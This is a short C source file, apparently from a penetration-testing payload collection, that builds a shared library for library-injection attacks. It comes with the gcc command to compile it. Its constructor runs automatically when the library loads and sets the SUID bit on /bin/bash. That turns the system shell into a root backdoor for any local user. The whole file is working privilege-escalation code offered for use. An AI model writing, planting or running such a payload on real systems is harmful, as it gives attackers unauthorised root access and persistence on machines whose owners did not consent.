// Payload for library injection in C
// It will set bash SUID bit
// gcc -shared -fPIC -o dlib_bash_suid.so dlib_bash_suid.c

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

void __attribute__((constructor)) initLibrary(void) {
    // Get the current permissions of bash
    struct stat st;
    if(stat("/bin/bash", &st) == -1) {
        perror("Could not stat /bin/bash");
        return;
    }

    // Add the SUID bit
    if(chmod("/bin/bash", st.st_mode | S_ISUID) == -1) {
        perror("Failed to add SUID to /bin/bash");
    } else {
        printf("Successfully added SUID to /bin/bash\n");
    }
}

void dummy_function(void) {
    // Dummy function to make this a valid shared library
}


